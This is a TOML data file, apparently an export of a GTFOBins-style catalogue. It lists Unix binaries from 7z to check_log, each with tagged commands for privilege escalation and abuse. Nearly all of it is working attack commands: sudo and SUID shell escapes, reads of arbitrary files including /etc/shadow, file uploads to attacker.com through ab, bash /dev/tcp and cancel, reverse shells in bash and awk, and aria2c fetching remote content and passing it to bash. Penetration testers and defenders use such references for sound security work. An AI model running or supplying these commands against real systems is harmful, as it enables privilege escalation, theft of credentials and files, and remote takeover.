[[privilege-esclation]]
  Name = "7z"
  Description = ""
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n"
[[privilege-esclation]]
  Name = "aa-exec"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "aa-exec /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo aa-exec /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./aa-exec /bin/sh -p"
[[privilege-esclation]]
  Name = "ab"
  Description = ""
  Tags = ["file-upload", "file-download", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "URL=http://attacker.com/file_to_download\nab -v2 $URL\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL\n"
    [[privilege-esclation.exps.sudo]]
      exp = "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL\n"
    [[privilege-esclation.exps.suid]]
      exp = "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL\n"
[[privilege-esclation]]
  Name = "agetty"
  Description = ""
  Tags = ["suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.suid]]
      exp = "./agetty -o -p -l /bin/sh -a root tty"
[[privilege-esclation]]
  Name = "alpine"
  Description = "The file is displayed in the `alpine` curses terminal interface. Other options might be available, for example by pressing `S` is possible to save the file content elsewhere."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nalpine -F \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo alpine -F \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./alpine -F \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "ansible-playbook"
  Description = ""
  Tags = ["sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF\n"
[[privilege-esclation]]
  Name = "ansible-test"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "ansible-test shell"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ansible-test shell"
[[privilege-esclation]]
  Name = "aoss"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "aoss /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo aoss /bin/sh"
[[privilege-esclation]]
  Name = "apt-get"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "apt-get changelog apt\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo apt-get changelog apt\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
[[privilege-esclation]]
  Name = "apt"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "apt changelog apt\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo apt changelog apt\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
[[privilege-esclation]]
  Name = "ar"
  Description = "The file appears amid the binary content of the archive."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "TF=$(mktemp -u)\nLFILE=file_to_read\nar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "TF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\"\n"
[[privilege-esclation]]
  Name = "aria2c"
  Description = "Note that the subprocess is immediately sent to the background."
  Tags = ["command", "file-download", "sudo", "limited-suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x\n"
    [[privilege-esclation.exps.command]]
      exp = "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"
    [[privilege-esclation.exps.file-download]]
      exp = "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o \"$LFILE\" \"$URL\"\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x\n"
    [[privilege-esclation.exps.sudo]]
      exp = "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x\n"
[[privilege-esclation]]
  Name = "arj"
  Description = ""
  Tags = ["suid", "file-read", "file-write", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "TF=$(mktemp -u)\nLFILE=file_to_read\narj a \"$TF\" \"$LFILE\"\narj p \"$TF\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\narj e \"$TF/a\" $LDIR\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR\n"
    [[privilege-esclation.exps.suid]]
      exp = "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR\n"
[[privilege-esclation]]
  Name = "arp"
  Description = "The read file content is corrupted by error prints.\n"
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\narp -v -f \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "as"
  Description = "The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nas @$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo as @$LFILE\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./as @$LFILE\n"
[[privilege-esclation]]
  Name = "ascii-xfr"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nascii-xfr -ns \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "ascii85"
  Description = ""
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nascii85 \"$LFILE\" | ascii85 --decode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode\n"
[[privilege-esclation]]
  Name = "ash"
  Description = ""
  Tags = ["shell", "file-write", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "ash"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo ash"
    [[privilege-esclation.exps.suid]]
      exp = "./ash"
[[privilege-esclation]]
  Name = "aspell"
  Description = "The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\naspell -c \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo aspell -c \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./aspell -c \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "at"
  Description = ""
  Tags = ["shell", "command", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.command]]
      exp = "COMMAND=id\necho \"$COMMAND\" | at now\n"
    [[privilege-esclation.exps.shell]]
      exp = "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null\n"
    [[privilege-esclation.exps.sudo]]
      exp = "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"
[[privilege-esclation]]
  Name = "atobm"
  Description = "Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'\n"
[[privilege-esclation]]
  Name = "awk"
  Description = ""
  Tags = ["file-read", "suid", "sudo", "limited-suid", "shell", "non-interactive-reverse-shell", "non-interactive-bind-shell", "file-write"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nawk '//' \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n"
    [[privilege-esclation.exps.limited-suid]]
      exp = "./awk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.non-interactive-bind-shell]]
      exp = "LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
    [[privilege-esclation.exps.non-interactive-reverse-shell]]
      exp = "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n"
    [[privilege-esclation.exps.shell]]
      exp = "awk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./awk '//' \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "aws"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "aws help\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo aws help\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "base32"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo base32 \"$LFILE\" | base32 --decode\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\nbase32 \"$LFILE\" | base32 --decode\n"
[[privilege-esclation]]
  Name = "base58"
  Description = ""
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbase58 \"$LFILE\" | base58 --decode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo base58 \"$LFILE\" | base58 --decode\n"
[[privilege-esclation]]
  Name = "base64"
  Description = ""
  Tags = ["suid", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbase64 \"$LFILE\" | base64 --decode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo base64 \"$LFILE\" | base64 --decode\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./base64 \"$LFILE\" | base64 --decode\n"
[[privilege-esclation]]
  Name = "basenc"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo basenc --base64 $LFILE | basenc -d --base64\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\nbasenc --base64 $LFILE | basenc -d --base64\n"
[[privilege-esclation]]
  Name = "basez"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbasez \"$LFILE\" | basez --decode\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo basez \"$LFILE\" | basez --decode\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./basez \"$LFILE\" | basez --decode\n"
[[privilege-esclation]]
  Name = "bash"
  Description = ""
  Tags = ["reverse-shell", "sudo", "shell", "file-upload", "file-download", "file-write", "file-read", "library-load", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-download]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n"
    [[privilege-esclation.exps.file-download]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nbash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "export LFILE=file_to_read\nbash -c 'echo \"$(<$LFILE)\"'\n"
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nHISTTIMEFORMAT=$'\\r\\e[K'\nhistory -r $LFILE\nhistory\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'echo -e \"POST / HTTP/0.9\\n\\n$(<$LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nbash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "export LFILE=file_to_write\nbash -c 'echo DATA > $LFILE'\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nHISTIGNORE='history *'\nhistory -c\nDATA\nhistory -w $LFILE\n"
    [[privilege-esclation.exps.library-load]]
      exp = "bash -c 'enable -f ./lib.so x'"
    [[privilege-esclation.exps.reverse-shell]]
      exp = "export RHOST=attacker.com\nexport RPORT=12345\nbash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'\n"
    [[privilege-esclation.exps.shell]]
      exp = "bash"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo bash"
    [[privilege-esclation.exps.suid]]
      exp = "./bash -p"
[[privilege-esclation]]
  Name = "batcat"
  Description = "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply. `--paging always` can be omitted provided that the output doesn't fit the screen."
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "./batcat --paging always /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "batcat --paging always /etc/profile\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo batcat --paging always /etc/profile\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "bc"
  Description = "The file content is actually parsed and appears as error messages, thus it might not be suitable to read arbitray binary files."
  Tags = ["file-read", "sudo", "suid"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbc -s $LFILE\nquit\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo bc -s $LFILE\nquit\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./bc -s $LFILE\nquit\n"
[[privilege-esclation]]
  Name = "bconsole"
  Description = ""
  Tags = ["shell", "sudo", "file-read"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "bconsole -c /etc/shadow"
    [[privilege-esclation.exps.shell]]
      exp = "bconsole\n@exec /bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo bconsole\n@exec /bin/sh\n"
[[privilege-esclation]]
  Name = "bpftrace"
  Description = ""
  Tags = ["sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.sudo]]
      exp = "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'BEGIN {system(\"/bin/sh\");exit()}' >$TF\nsudo bpftrace $TF\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
[[privilege-esclation]]
  Name = "bridge"
  Description = "Outputs the first line of the file (until the first whitespace) inside an error message to stdandard error."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbridge -b \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo bridge -b \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./bridge -b \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "bundle"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "bundle help\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "export BUNDLE_GEMFILE=x\nbundle exec /bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle exec /bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundle console\nsystem('/bin/sh -c /bin/sh')\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundle install\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo bundle help\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "bundler"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "bundler help\n!/bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "export BUNDLE_GEMFILE=x\nbundler exec /bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler exec /bin/sh\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ntouch $TF/Gemfile\ncd $TF\nbundler console\nsystem('/bin/sh -c /bin/sh')\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\necho 'system(\"/bin/sh\")' > $TF/Gemfile\ncd $TF\nbundler install\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo bundler help\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "busctl"
  Description = "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "busctl --show-machine\n!/bin/sh\n"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo busctl --show-machine\n!/bin/sh\n"
[[privilege-esclation]]
  Name = "busybox"
  Description = "BusyBox may contain many UNIX utilities, run `busybox --list-full` to check what GTFOBins binaries are supported. Here some example."
  Tags = ["file-upload", "file-write", "file-read", "suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\n./busybox cat \"$LFILE\"\n"
    [[privilege-esclation.exps.file-upload]]
      exp = "LPORT=12345\nbusybox httpd -f -p $LPORT -h .\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nbusybox sh -c 'echo \"DATA\" > $LFILE'\n"
    [[privilege-esclation.exps.shell]]
      exp = "busybox sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo busybox sh"
    [[privilege-esclation.exps.suid]]
      exp = "./busybox sh"
[[privilege-esclation]]
  Name = "byebug"
  Description = ""
  Tags = ["shell", "limited-suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.limited-suid]]
      exp = "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\n./byebug $TF\ncontinue\n"
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nbyebug $TF\ncontinue\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp)\necho 'system(\"/bin/sh\")' > $TF\nsudo byebug $TF\ncontinue\n"
[[privilege-esclation]]
  Name = "bzip2"
  Description = "There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID."
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nbzip2 -c $LFILE | bzip2 -d\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo bzip2 -c $LFILE | bzip2 -d\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./bzip2 -c $LFILE | bzip2 -d\n"
[[privilege-esclation]]
  Name = "c89"
  Description = ""
  Tags = ["sudo", "file-read", "file-write", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nc89 -x c -E \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_delete\nc89 -xc /dev/null -o $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "c89 -wrapper /bin/sh,-s ."
    [[privilege-esclation.exps.sudo]]
      exp = "sudo c89 -wrapper /bin/sh,-s ."
[[privilege-esclation]]
  Name = "c99"
  Description = ""
  Tags = ["file-read", "file-write", "shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nc99 -x c -E \"$LFILE\"\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_delete\nc99 -xc /dev/null -o $LFILE\n"
    [[privilege-esclation.exps.shell]]
      exp = "c99 -wrapper /bin/sh,-s ."
    [[privilege-esclation.exps.sudo]]
      exp = "sudo c99 -wrapper /bin/sh,-s ."
[[privilege-esclation]]
  Name = "cabal"
  Description = ""
  Tags = ["suid", "sudo", "shell"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "cabal exec -- /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo cabal exec -- /bin/sh"
    [[privilege-esclation.exps.suid]]
      exp = "./cabal exec -- /bin/sh -p"
[[privilege-esclation]]
  Name = "cancel"
  Description = ""
  Tags = ["file-upload"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-upload]]
      exp = "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\ncancel -u \"$(cat $LFILE)\" -h $RHOST:$RPORT\n"
[[privilege-esclation]]
  Name = "capsh"
  Description = ""
  Tags = ["shell", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "capsh --"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo capsh --"
    [[privilege-esclation.exps.suid]]
      exp = "./capsh --gid=0 --uid=0 --"
[[privilege-esclation]]
  Name = "cat"
  Description = ""
  Tags = ["file-read", "suid", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncat \"$LFILE\"\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo cat \"$LFILE\"\n"
    [[privilege-esclation.exps.suid]]
      exp = "LFILE=file_to_read\n./cat \"$LFILE\"\n"
[[privilege-esclation]]
  Name = "cdist"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "cdist shell -s /bin/sh"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo cdist shell -s /bin/sh"
[[privilege-esclation]]
  Name = "certbot"
  Description = ""
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
    [[privilege-esclation.exps.sudo]]
      exp = "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'\n"
[[privilege-esclation]]
  Name = "check_by_ssh"
  Description = "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n"
  Tags = ["shell", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.shell]]
      exp = "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
    [[privilege-esclation.exps.sudo]]
      exp = "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
[[privilege-esclation]]
  Name = "check_cups"
  Description = "This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n"
  Tags = ["file-read", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE\n"
[[privilege-esclation]]
  Name = "check_log"
  Description = "This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n"
  Tags = ["file-read", "file-write", "sudo"]
  [privilege-esclation.exps]
    [[privilege-esclation.exps.file-read]]
      exp = "LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT\n"
    [[privilege-esclation.exps.file-write]]
      exp = "LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE\n"
    [[privilege-esclation.exps.sudo]]
      exp = "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE\n"
